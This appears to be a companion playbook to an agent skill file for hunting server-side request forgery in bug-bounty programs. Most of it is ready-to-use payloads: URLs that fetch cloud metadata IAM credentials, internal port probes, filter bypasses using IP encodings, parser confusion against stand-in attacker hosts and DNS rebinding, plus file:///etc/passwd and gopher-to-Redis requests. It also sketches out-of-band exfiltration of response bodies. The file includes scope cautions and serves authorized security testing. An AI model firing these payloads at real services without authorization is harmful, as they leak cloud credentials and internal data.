# SSRF Hunter — Deep Workflows

Companion to SKILL.md. OOB confirmation, cloud metadata, filter bypasses.

## Step 1: Find URL-consuming features

```text
importers (URL upload, "fetch from link"), webhook testers/validators,
PDF/image generators (html->pdf), avatar fetchers, SSO/SAML metadata
loaders, RSS/feed readers, preview generators (link cards), file
converters with remote source, proxy endpoints.
```

## Step 2: OOB baseline (always first)

```bash
# interactsh client
wsl interactsh-client -o programs/<slug>/temp/oob.log
# Then per feature:
?url=https://<your-oob-host>/probe1
# Confirm: DNS callback AND HTTP callback arrive from target egress IP.
# Note WHICH protocol/port reached you — maps egress allowlists.
```

## Step 3: Cloud metadata ladder

```bash
# AWS IMDSv1 (unauthenticated):
?url=http://169.254.169.254/latest/meta-data/
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
# AWS IMDSv2 requires PUT X-aws-ec2-metadata-token first -> SSRF via GET
# cannot fetch token; try redirect trick only if app follows redirects:
?url=http://169.254.169.254%23@attacker   # parser confusion attempts

# GCP:
?url=http://metadata.google.internal/computeMetadata/v1/
  (requires header Metadata-Flavor: Google — injectable if headers pass)
# Azure:
?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
  (requires header Metadata: true)

# Kubernetes:
?url=https://kubernetes.default.svc/api/v1/namespaces/default/pods
```

If response is reflected back to you: full credential proof possible.
If not: use partial-response diffing or OOB exfil of body via chained
fetch (`?next=` parameters that re-fetch returned URLs).

## Step 4: Internal network mapping (keep volume minimal)

```bash
# Single-request port probes against common app ports only:
for p in 80 443 3000 5000 8000 8080 8443 9090; do :; done
?url=http://127.0.0.1:$p/
# Differentiate by response length/timing/title; log everything.
# NEVER mass-scan RFC1918 from the target — pick documented internal names.
```

## Step 5: Filter bypass matrix (apply after a block is CONFIRMED)

```text
IP encodings of 127.0.0.1:
  2130706433 (decimal)  0177.0.0.1 (octal)  0x7f000001 (hex)
  127.1 (short)         127.0.0.1.nip.io    localhost.localdomain
Metadata variants:
  2852039166 / 0xA9FEA9FE / 169.254.169.254.nip.io
Parser confusions:
  http://expected-host@169.254.169.254/     (userinfo)
  http://expected-host#@169.254.169.254/    (fragment)
  http://target.com@evil/ vs http://evil@target.com  disambiguation
Redirect chains:
  your-server/302 -> Location: http://169.254.169.254/  (if redirects followed,
  and validator checks only FIRST hop)
DNS rebinding:
  rbndr.us/<hex-ip1>/<hex-ip2> style hostnames; TOCTOU between resolve+fetch
Scheme tricks:
  file:///etc/passwd   gopher://127.0.0.1:6379/_INFO   dict://
```

## Step 6: gopher escalation pattern (documented class)

When gopher:// survives filters, arbitrary TCP payloads become possible
(redis SET/CONFIG commands, SMTP). Document capability; do not actually
modify remote state — capture banner-level proof only.

## False-positive elimination

1. Your own monitoring prefetch can cause self-callbacks — correlate IPs.
2. Some apps pre-resolve DNS for SSRF protection but still connect raw —
   rebinding tests must verify actual connection IP server-side.
3. A 200 on `?url=http://internal` may be the app's error page rendered;
   compare bodies byte-wise.
